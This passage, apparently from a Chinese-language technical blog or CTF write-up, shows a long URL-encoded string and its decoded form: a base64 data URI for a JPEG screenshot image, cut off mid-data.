class="number">2</span>BdCgAoAKAM3X9Gi13SJbKTCsfmjf8AuOOh%<span class="number">2</span>FwA9iaipBTjY68FipYWsqi%<span class="number">2</span>BfmjL8Ha1Ld20mk6hldRsDsdW6uo4De%<span class="number">2</span>FofwPes6M21yy3R25phY05KvS%<span class="number">2</span>BCeq9ex01bnjmF4p8OjXLJXgbyr%<span class="number">2</span>B2O%<span class="number">2</span>B3lBwc9cE%<span class="number">2</span>Bn8jWVWnzrTc9LLsd9VnaWsJboj8L%<span class="number">2</span>BIzqsb2N8vkana%<span class="number">2</span>FLNEwwWx%<span class="number">2</span>FEP60qVTm0e6KzDA%<span class="number">2</span>BwaqU9actn%<span class="number">2</span>Bh0NbHlhQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQBT1TU7XSLCS8vJNkaDp3Y9gPU1MpKKuzfD4epiKip01qzmfD%<span class="number">2</span>Bm3PiDVf%<span class="number">2</span>BEm1eMqg%<span class="number">2</span>F48rduir2b%<span class="number">2</span>FAA9Tz6VhTi5y9pL5Hs42vDCUfqdB6%<span class="number">2</span>Faf6f16dzsq6T585%<span class="number">2</span>Fxdrr6Tp621pltQvD5cCL1GeN3%<span class="number">2</span>BHvWNapyqy3Z6mWYNV6nPU%<span class="number">2</span>BCOr%<span class="number">2</span>FyLHhnQ00HSEtjhp3%<span class="number">2</span>Bed%<span class="number">2</span>F7zn%<span class="number">2</span>Bg6VVKHJGxlj8W8VWc%<span class="number">2</span>Bi0XobFaHAFABQAUAFAHKeLNIuYLmLxJpK4vbTmVAP9anfPrx%<span class="number">2</span>Bn0Fc9WDT547o9vLcTCUXhK%<span class="number">2</span>Fwy28n%<span class="number">2</span>FX4m5ousW2uabHe2x4bh0J5Ru4Nawmpq6POxWFnharpz%<span class="number">2</span>F4dF%<span class="number">2</span>BrOU5zxN4ckvnTVdKfyNVtuUcceaB%<span class="number">2</span>FCf8%<span class="number">2</span>Bx46YVad%<span class="number">2</span>FejuetgMdGknQr605fh5%<span class="number">2</span>F16knhzxPFrAa0uU%<span class="number">2</span>By6lDxLbtxkjqVz%<span class="number">2</span>FLt%<span class="number">2</span>BtOnVU9HuRjsvlh%<span class="number">2</span>Ffg%<span class="number">2</span>BaD2f%<span class="number">2</span>BZv1seYFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQBT1TVLPR7J7u9lEca9B3Y%<span class="number">2</span>BgHc1MpKKuzfD4epiKip01dnK6fYXnjLUU1fV4jDpkRza2jfx%<span class="number">2</span>F7R9v5%<span class="number">2</span>FSueMXVfNLY9utWp5dSdCg7zfxS7eS%<span class="number">2</span>FrT1O1AAGAMAV1HzpV1TU7bSNPlvbp9scY6d2PYD3NTKSirs3w9CeIqKnDdnN%<span class="number">2</span>BF9OudV1F%<span class="number">2</span>FFGrJiSUYtIj0jTsfy6fie9YUouT9pL5Hr5hXhQpLBUHovifd%<span class="number">2</span>F1%<span class="number">2</span>FkdfXSeCFABQAUAFABQAUAcTqlnc%<span class="number">2</span>BDtVbW9MjMmmzn%<span class="number">2</span>FTLZeif7Q9P6dOhrllF0pc8dup9Fh6sMxo%<span class="number">2</span>FVqztNfC%<span class="number">2</span>B%<span class="number">2</span>Fl%<span class="number">2</span>FX5nXWN9balZx3dpKJIZBlWH8j6GuiMlJXR4VajOjN05qzRYqjIwPEfhePVyt5aSfZNSh5inXjOOgbH8%<span class="number">2</span>B36VjUpc2q0Z6mBzCWH%<span class="number">2</span>FdzXNB7r%<span class="number">2</span>FIpaR4ukhuxpPiOL7HfLwsp4jl989Bn16fTpUwrWfLPRnRicsjKHt8I%<span class="number">2</span>BaHbqv6%<span class="number">2</span>B86uug8MWgAoAKACgAoAKACgAoAKACgAoAKACgAoAKAMXX%<span class="number">2</span>FFFjoEYWQma6cfu7dD8zemfQVlUqxh6noYLL6uLd1pHqzI03w%<span class="number">2</span>Ff69fJrHiYfKvNvY%<span class="number">2</span>FwoP9of0%<span class="number">2</span>FP0rONOU3zVPuO%<span class="number">2</span>BvjaWFpvD4P5y7%<span class="number">2</span>Bn9enc7AAAYAwBXSeARXV1BZW0lzcyrFDGNzO3QCk2krsunTnUmoQV2zjbSC48daqNQvEaLRbVv3ELcec3qf6%<span class="number">2</span>Fl61ypOtK72R9BUnDK6PsqbvVlu%<span class="number">2</span>B39f8HsduAFAAGAOgFdZ85uLQAUAFABQAUAFABQA10WRGR1DKwwVIyCKBptO6OKu7K98EXr6jpiNcaRK2bi1zkxe4%<span class="number">2</span>FwAfwPrXK4ui%<span class="number">2</span>BaOx9FTq0szpqlWdqi2ff%<span class="number">2</span>Bv%<span class="number">2</span>BGOs03UrTVrNLuymEkTfmp9COxrojJSV0eHXoVMPNwqKzLdUYFDV9FsNbtTb30IcD7rjhkPqDUThGaszpw2Lq4afNTf8Akzlx%<span class="number">2</span>FwAJF4M4AbV9JXpj%<span class="number">2</span>FWQj%<span class="number">2</span>FD8x9Kw%<span class="number">2</span>FeUvNHs%<span class="number">2</span>F7HmP%<span class="number">2</span>FAE7qfg%<span class="number">2</span>F6%<span class="number">2</span>B%<span class="number">2</span>F1Oj0fxHpeuRg2dwPMxloX%<span class="number">2</span>BV1%<span class="number">2</span>FDv9RxW0KkZ7HlYrA18K%<span class="number">2</span>F3kdO%<span class="number">2</span>FQ1K0OIKACgAoAKACgAoAKACgAoAKACgCC8vbXT4DPd3EcEQ6s7YFJyUVdmlKlUqy5aauzlJ%<span class="number">2</span>FFOp6%<span class="number">2</span>FM1n4XtGCZw99MuFX6Z%<span class="number">2</span>Frz7VzOrKelNfM9yGX0MJH2mNlr%<span class="number">2</span>FKt%<span class="number">2</span>F6%<span class="number">2</span>FDzNLQvCNrpUpvbqRr7UHOWuJecH%<span class="number">2</span>FAGc%<span class="number">2</span>Fz61pToqOr1Zx4zMqldezguWHZfqdBWx5ZXvr62060e6u5lihjGSzfy9zSlJRV2a0qM601CmrtnHRQ3vjy8W4uVe10KF8xxdGnI7n%<span class="number">2</span>FHt0HOTXKk6zu%<span class="number">2</span>FhPflKllUOWHvVXu%<span class="number">2</span>B39f8OdtFFHBCkMKLHGgCqqjAA9K6kraI%<span class="number">2</span>BdlKU5OUndsfTJCgAoAKACgAoAKACgAoAQgMCCAQeCD3oBOxx%<span class="number">2</span>BoeHb%<span class="number">2</span>FQb19W8MfdbmewP3XH%<span class="number">2</span>ByP6dfT0rmlTlB81P7j36GOpYqCoYz5S7ev9evc2NA8T2OvR7Yz5N0g%<span class="number">2</span>FeW0n3lPfHqP88VpTqxn6nBjMvq4V3esejWxs1qeeFAHPax4L0vVJDcRBrK7zkTwcc%<span class="number">2</span>BpHf9D71jOjGWq0Z6uFzWvQXJL3o9mZnn%<span class="number">2</span>BMfDvE0K63aL%<span class="number">2</span>FGn%<span class="number">2</span>BtA%<span class="number">2</span>Fn%<span class="number">2</span>Bh%<span class="number">2</span>BtZ3q099UdfJluM%<span class="number">2</span>BF%<span class="number">2</span>Bzl%<span class="number">2</span>BH%<span class="number">2</span>BX5F7T%<span class="number">2</span>FHuiXjeXcSPYzdClwuAD9Rx%<span class="number">2</span>BeKuNeD30Oetk2Kp6wXMvL%<span class="number">2</span>FACOiguILmMSW80cyHo0bBh%<span class="number">2</span>BYrZNPY8qcJQdpKz8ySmQFABQAUAFABQAhIAJJwB3NAGNqPi7Q9MBE1%<span class="number">2</span>FG7j%<span class="number">2</span>FlnCd7fp0%<span class="number">2</span>FGspVoR3Z6FDLcVW%<span class="number">2</span>BGFl3ehjHxRr2ufJ4f0hoom6XVzwPqO386y9rOfwI9D%<span class="number">2</span>Bz8JhdcVUu%<span class="number">2</span>By%<span class="number">2</span>Fq%<span class="number">2</span>F5E1p4HNzcC88RX8mpTjpHuIjX2%<span class="number">2</span>Bn0wPamqF3ebuRUzfkj7PCQUF36%<span class="number">2</span>F1951MEENtCsMESRRoMKiLgD8K6EktEeJOcpy5pO7JKZJk674j0%<span class="number">2</span>FQIN9zJumYfu4E5d%<span class="number">2</span>FwDAe9ZzqRgtTuweBrYuVoLTq%<span class="number">2</span>BiMGz0PUvFN2mp%<span class="number">2</span>BIwYbRTugsBkcerf5yfYcVioSqPmnt2PTq4uhgYOjhNZdZf5f1b1OyREjRUjUIijCqowAPSuo%<span class="number">2</span>Bfbbd2OoEFABQAUAFABQAUAFABQAUAFABQBga74StNXkF5byNZagnKXEXBJ%<span class="number">2</span>F2sdfr1rGpSUtVoz1MHmVTDr2c1zQfR%<span class="number">2</span>FoZdv4o1Pw%<span class="number">2</span>FMtl4otWKE4S%<span class="number">2</span>BhXKt9cdf5%<span class="number">2</span>B1ZqrKDtUXzOyeX0MXH2mClr1i%<span class="number">2</span>FwCv%<span class="number">2</span>BB5nWWl5bX1utxaTpNE3RkbIrpTTV0eHUpTpS5ZqzJ6ZmFAFK%<span class="number">2</span>F0bTdUXF9ZQzn%<span class="number">2</span>B8y%<span class="number">2</span>FMPoeoqJQjLdHRRxVeh%<span class="number">2</span>FDk1%<span class="number">2</span>FXY56f4eWKSGXTL%<span class="number">2</span>B70%<span class="number">2</span>BTtsfcB%<span class="number">2</span>FI%<span class="number">2</span>FrWLw8d4ux6sM7qtctaCmv6%<span class="number">2</span>BX4Ef9jeNrH%<span class="number">2</span>Fj016G6QfwzryfzB%<span class="number">2</span>FnRyVltIr61llX%<span class="number">2</span>BJScX5f8ADr8g%<span class="number">2</span>FtHx7bcSaRZ3K%<span class="number">2</span>F3kYZ%<span class="number">2</span>F9D%<span class="number">2</span>FpRzV10D2GUz2qNf16B%<span class="number">2</span>FwAJN4qTiTws7H%<span class="number">2</span>FZY%<span class="number">2</span>F8A16Pa1f5Q%<span class="number">2</span>Fs%<span class="number">2</span>FAPauH%<span class="number">2</span>FCU%<span class="number">2</span>BJ2%<span class="number">2</span>B74UlH1Lf4Ue1qfyh%<span class="number">2</span>FZ2BW%<span class="number">2</span>BIX4f5h%<span class="number">2</span>FbXjifiDw%<span class="number">2</span>Fbx57yN0%<span class="number">2</span>FNhRz1ntEPquVx%<span class="number">2</span>BKs36f8Mw%<span class="number">2</span>By%<span class="number">2</span>BPr3h72ysVPUKAT%<span class="number">2</span>FI%<span class="number">2</span>FzotXfWwe0ymltFy%<span class="number">2</span>Fr1QDwHcXp3azr95dg8lFOAPzJ%<span class="number">2</span>FlR7Bv4pXD%<span class="number">2</span>B2IUtMPRUf68rfmbOn%<span class="number">2</span>BEtD0whoLCNpB%<span class="number">2</span>FHL85%<span class="number">2</span>FXp%<span class="number">2</span>BFaRpQjsjgr5liq2kp6eWn5Gx0rU88WgCK4uYLSBp7iZIYlGWd2wBSbSV2XCEqkuWCuzk7rxbfazO1h4WtWlbo95IuET3Gf6%<span class="number">2</span>Fka53Wc3amvme5Ty2lh4%<span class="number">2</span>B1xsrf3Vu%<span class="number">2</span>F68vvL2h%<span class="number">2</span>BEINPn%<span class="number">2</span>FtDUJjqGoscmaTkKf9kH%<span class="number">2</span>Bf8AKqhRUXeWrObF5nOrH2VJcsOy%<span class="number">2</span>FU6OtzyQoAKACgAoAKACgAoAKACgAoAKACgAoAKAI54IbqFoZ4kljcYZHXIP4Umk1ZlQnKElKLszlLrwVNY3DXnhq%<span class="number">2</span>FewmPJhdiY29u%<span class="number">2</span>F65rndFp3pux7dPNo1Y%<span class="number">2</span>BzxkOZd%<span class="number">2</span>Bv8AXpYZH4x1HR3EHiXSpIecC5gGUb%<span class="number">2</span>Bn5H8KPbSjpURTyujiFzYOpfye%<span class="number">2</span>FwDXy%<span class="number">2</span>BZ0ena3pmrKDY3sUx67AcMPqp5raM4y2Z5NfCV6D%<span class="number">2</span>FeRa%<span class="number">2</span>FL7y%<span class="number">2</span>FVnMFABQAUAFABQAUAFABQAUAUtQ1fTtLTffXkUHGQGb5j9B1NTKcY7s6KOGrV3anFs5uXxrd6nIbfw1pUt0%<span class="number">2</span>FQzyjai%<span class="number">2</span>FwCfcisHWctKaPXjlNOgufGVFFdlv%<span class="number">2</span>FXpcWDwZeapOt34n1F7phyttE22Nf8APtj6mhUXJ3qMU80p0I8mDhy%<span class="number">2</span>Bb3%<span class="number">2</span>Fr1%<span class="number">2</span>B46q1tbeygWC1hSGJeiIuAK6EklZHiVKk6kuabuyamQFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQA10SRCkiK6sMFWGQaBpuLujndR8B6JfMZIYnsps5D27bRn%<span class="number">2</span>Fd6flisJUIPbQ9ahnGKpK0nzLz%<span class="number">2</span>FAMyj%<span class="number">2</span>FYnjDSf%<span class="number">2</span>BQdrSX0Q6R3I5Ptzn%<span class="number">2</span>BYqOSrH4Xc6freW4j%<span class="number">2</span>BLS5X3X9L8g%<span class="number">2</span>FwCEq8SafxqnhmRwOslsSQPy3D9aftakfiiL%<span class="number">2</span>BzsFV%<span class="number">2</span>Fg1%<span class="number">2</span>Fv8A6X5EsPxI0ZjtuIbu2cdQ8YOPyOf0oWJh1JlkWJWsGmvUvReOPDko41JV9njdf5irVem%<span class="number">2</span>BpyyynGx%<span class="number">2</span>Bx%<span class="number">2</span>BK%<span class="number">2</span>FzLC%<span class="number">2</span>BK9Abpq1t%<span class="number">2</span>BL4qvaw7mTy7Fr%<span class="number">2</span>Fl2wPirQF66ta%<span class="number">2</span>Fg%<span class="number">2</span>BaPaw7gsuxb%<span class="number">2</span>FwCXb%<span class="number">2</span>B4gk8b%<span class="number">2</span>BHIuupof92N2%<span class="number">2</span>FkKl16a6mscpxsvsfiv8AMoTfEfREO2BLq4Y9AkeM%<span class="number">2</span>FmRUvEw6HTDIsU9ZNL5kX%<span class="number">2</span>FCW%<span class="number">2</span>BIL%<span class="number">2</span>FAI0rwzKAeklwSFP8h%<span class="number">2</span>BtL205fDEv%<span class="number">2</span>BzcHS%<span class="number">2</span>Fj116L%<span class="number">2</span>Bn%<span class="number">2</span>BQf2T401b%<span class="number">2</span>Fj%<span class="number">2</span>B1aLToj1jtx8w%<span class="number">2</span>FL%<span class="number">2</span>F4qlyVpbuw%<span class="number">2</span>FrOWYf8AhU3N93%<span class="number">2</span>Fwf8i3YeAdGtH826WS%<span class="number">2</span>FmzktcNkE%<span class="number">2</span>FQf1zVxw8Fq9TnrZziai5YWivL%<span class="number">2</span>BvysdJFFHBGscUaxovAVBgD8K2StseTKUpO8ndj6ZIUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFAEU1tBcDE0Mco9HUH%<span class="number">2</span>BdJpPcuM5w%<span class="number">2</span>BF2KMvhvQ5jl9Js8nuIVH8qh04PodMcfio7VH97K7eDfDrddLi%<span class="number">2</span>FAsP60vY0%<span class="number">2</span>Bxqs0xi%<span class="number">2</span>F5eP8AAB4N8Or00uL8Sx%<span class="number">2</span>FrR7Gn2B5pjH%<span class="number">2</span>Fy8f4E8fhnQovuaTacf3oQ386apQXQylj8VLeo%<span class="number">2</span>FvL8Nrb2wxBBFEP9hAv8qtJLY5pVJz%<span class="number">2</span>BJtktMgKACgAoAKACgAoAKACgAoAKACgAoAKAP%<span class="number">2</span>F9k%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>url解码后：（主要以base64为主）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:image/jpeg;base64,/<span class="number">9</span>j/<span class="number">4</span>AAQSkZJRgABAQAAAQABAAD<span class="comment">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